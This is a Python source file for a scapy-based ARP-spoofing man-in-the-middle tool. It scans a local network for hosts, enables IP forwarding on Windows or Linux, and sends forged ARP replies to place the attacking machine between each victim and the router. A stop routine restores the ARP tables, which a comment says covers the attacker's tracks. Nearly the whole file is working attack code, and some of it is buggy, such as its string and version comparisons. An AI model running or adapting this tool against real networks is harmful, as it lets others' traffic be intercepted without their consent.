"""
Copyright (C) 2020 Tyrone Westall

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

# ARP MITM - Windows Version
# This tool will start by requesting details of the Router IP, network address and the subnet mask. It will then conduct
# a syn scan on the network and find out which hosts are alive. Once a target list has been generated the program will
# send an ARP broadcast on the local network, and the machine running the program will (hopefully) act as the
# default gateway for the network, forwarding traffic to the real default gateway.

import sys
import os
import platform
from scapy.all import *
from netscanner import netscan_main

# Define text colours
B, R, Y, G, M, N = '\33[94m', '\033[91m', '\33[93m', '\033[1;32m', '\033[1;35m', '\033[0m'

# Define the class
class arp_mitm:
    def __init__(self, target, rtrip, atkopt, timeout=1, pktintr=0.1):
        # Netscanner/MITM variables
        self.target = target  # Target machine/network
        self.rtrip = rtrip  # Default gateway for the network
        self.atkopt = atkopt  # 0 = Start MITM, 1 = Stop MITM
        self.timeout = timeout  # Response timeout value
        self.pktintr = float(pktintr)  # Interval between packets
        self.rtr_scan = {}
        self.rtrmac = ""
        self.tgt_list = {}

        # OS Details variables
        self.osname = platform.system()  # Get the OS name of attacking machine
        self.osver = platform.release()  # Get the OS version of attacking machine (for windows only)

        # Windows - Routing & Remote Access Service (RRAS) variables
        self.svc_ipr_query = ['sc', 'query', 'RemoteAccess']  #Query RRAS
        self.svc_ipr_start = ['sc', 'start', 'RemoteAccess']  #Start RRAS
        self.svc_ipr_stop = ['sc', 'stop', 'RemoteAccess']  #Stop RRAS

        # Linux - IP Forwarding file name
        self.ipforward_file = "/proc/sys/net/ipv4/ip_forward"

    # Call netscanner to conduct an ARP scan of the target/network and build the target list, get mac addresses from all responses
    def find_targets(self):
        netscan = netscan_main.netscanner(1, self.target, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1)
        netscan_rtr = netscan_main.netscanner(1, self.rtrip, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1)
        # Build target list based on network scan
        self.tgt_list = netscan.init_scan()
        self.rtr_scan = netscan_rtr.init_scan()
        if self.tgt_list == False:
            print("{0}[*] No targets found via ARP scan. Exiting...".format(R))
            return False
        # Targets found, remove the router from the target list if it responded via ARP. If the router was the only response, then exit the script.
        for key, value in self.tgt_list.items():
            if self.rtrip in value:
                self.tgt_list.pop(key)
                print("{0}[*] Router %s removed from target list".format(B) % self.rtrip)
                if len(self.tgt_list) == 0:
                    print("{0}[*] No valid targets remaining. Exiting...".format(R))
                    return False

        for key, value in self.rtr_scan.items():
            if self.rtrip in value:
                self.rtrmac = self.rtr_scan[key].split('-')
                self.rtrmac = self.rtrmac[1]
            else:
                print("{0}[*] Router IP did not respond to ARP request. Exiting...".format(R))
                return False

        if self.atkopt == 0:
            # Start ARP MITM
            self.start_arp_mitm()
        else:
            # Stop ARP MITM
            self.stop_arp_mitm()

    def query_svc_ipr(self):
        # Query RRAS
        cmd_result = subprocess.Popen(self.svc_ipr_query, stdout=subprocess.PIPE)
        cmd_result = cmd_result.stdout.read()
        return cmd_result

    def start_svc_ipr(self):
        # Start RRAS
        subprocess.Popen(self.svc_ipr_start, stdout=subprocess.PIPE)
        return True

    def stop_svc_ipr(self):
        # Stop RRAS
        subprocess.Popen(self.svc_ipr_stop, stdout=subprocess.PIPE)
        return True

    def start_arp_mitm(self):
        print("{0}[*] Starting ARP MITM attack...".format(N))
        # If attacking machine is Windows...
        if self.osname == 'Windows' and self.osver >= 7:
            # Check RRAS. If RRAS is not running, start it
            cmd_result = self.query_svc_ipr()
            if b"STOPPED" in cmd_result:
                self.start_svc_ipr()
                print("{0}[*] Starting Routing and Remote Access Service...".format(B))
                time.sleep(3)
                # Check to see if RRAS is started. Enter a while loop if it is still starting until it has started.
                cmd_result = self.query_svc_ipr()
                if b"STARTED" in cmd_result:
                    print("{0}[*] Routing and Remote Access Service started, continuing...".format(G))
                elif b"STARTING" in cmd_result:
                    while b"STARTING" in cmd_result:
                        time.sleep(2)
                        cmd_result = self.query_svc_ipr()
                        if b"STARTED" in cmd_result:
                            print("{0}[*] Routing and Remote Access Service started, continuing...".format(G))
                            break
                else:
                    print("{0}Unable to start Routing and Remote Access Service, exiting...".format(R))
                    return False
            elif b"STARTED" in cmd_result:
                print("{0}[*] Routing and Remote Access Service started, continuing...".format(G))
        # If attacking machine is Linux...
        if self.osname == 'Linux':
            # Open the IP Forwarding file. If the file exists and is set to 1, continue. If the file is empty or contains 0, create the file with the value 1.
            f = open(self.ipforward_file, "r")
            result = f.read()
            if result == "1":
                print("{0}[*] IP Forwarding already started, continuing...".format(G))
                f.close()
            elif result is not "1":
                if result is "0" or not "":
                    f.close()
                    os.remove(self.ipforward_file)
                    f = open(self.ipforward_file, "w")
                print("{0}[*] Starting IP Forwarding...".format(B))
                f.write("1")
                print("{0}[*] IP Forwarding started, file {1} modified. Continuing...".format(G, self.ipforward_file))
                f.close()
        # Send the ARP packet(s) to the target(s) and router. Tell the victims we are the router, tell the router we are the victim(s)
        for i in self.tgt_list:
            try:
                result = self.tgt_list[i].split('-')
                send(ARP(op=2, pdst=result[1], psrc=self.rtrip, hwdst=result[0]), count=1, verbose=0)
                send(ARP(op=2, pdst=self.rtrip, psrc=result[1], hwdst=self.rtrmac), count=1, verbose=0)
                print("{0}[*] Target %s poisoned".format(G) % result[1])
            except Exception:
                print("{0}[*] Unable to poison target %s".format(R) % result[1])
        return True

    def stop_arp_mitm(self):
        print("{0}[*] Stopping ARP MITM attack...".format(N))
        # Re-ARP the target(s) and router so that their traffic flows to the correct destinations, this will (hopefully) cover our tracks
        for i in self.tgt_list:
            try:
                result = self.tgt_list[i].split('-')
                send(ARP(op=2, pdst=result[1], psrc=self.rtrip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.rtrmac), verbose=0, count=5)
                send(ARP(op=2, pdst=self.rtrip, psrc=result[1], hwdst=self.rtrmac, hwsrc=result[0]), verbose=0, count=5)
                print("{0}[*]Target %s restored".format(G) % result[1])
            except Exception:
                print("{0}[*] Unable to restore target %s".format(R) % result[1])

        # If attacking machine is Windows...
        if self.osname == 'Windows' and self.osver >= 7:
            #Stop RRAS
            cmd_result = self.query_svc_ipr()
            if b"STARTED" in cmd_result:
                self.stop_svc_ipr()
                print("{0}[*] Stopping Routing and Remote Access Service...".format(B))
                time.sleep(3)
                # Check to see if RRAS is stopped. If not, enter a while loop until it is stopped. If for any reason RRAS doesn't stop, tell the user to stop it manually.
                cmd_result = self.query_svc_ipr()
                if b"STOPPED" in cmd_result:
                    print("{0}[*] Routing and Remote Access Service stopped.".format(G))
                elif b"STOPPING" in cmd_result:
                    while b"STOPPING" in cmd_result:
                        time.sleep(2)
                        cmd_result = self.query_svc_ipr()
                        if b"STOPPED" in cmd_result:
                            print("{0}[*] Routing and Remote Access Service stopped.".format(G))
                            break
                else:
                    print("{0}Unable to stop Routing and Remote Access Service, please manually stop it in Services.".format(R))
                    return False
            elif b"STOPPED" in cmd_result:
                print("{0}[*] Routing and Remote Access Service stopped.".format(G))
        # If attacking machine is Linux...
        if self.osname == 'Linux':
            # Open the IP Forwarding file. If the file exists and is set to 0, continue. If the file is empty or contains 1, create the file with the value 0.
            f = open(self.ipforward_file, "r")
            result = f.read()
            if result == "0":
                print("{0}[*] IP Forwarding stopped.".format(G))
                f.close()
            elif result is not "0":
                if result is "1" or not "":
                    f.close()
                    os.remove(self.ipforward_file)
                    f = open(self.ipforward_file, "w")
                print("{0}[*] Starting IP Forwarding...".format(B))
                f.write("0")
                print("{0}[*] IP Forwarding stopped, file {1} modified.".format(G, self.ipforward_file))
                f.close()

        print("{0}[*] Targets restored. Exiting...".format(G))
        return True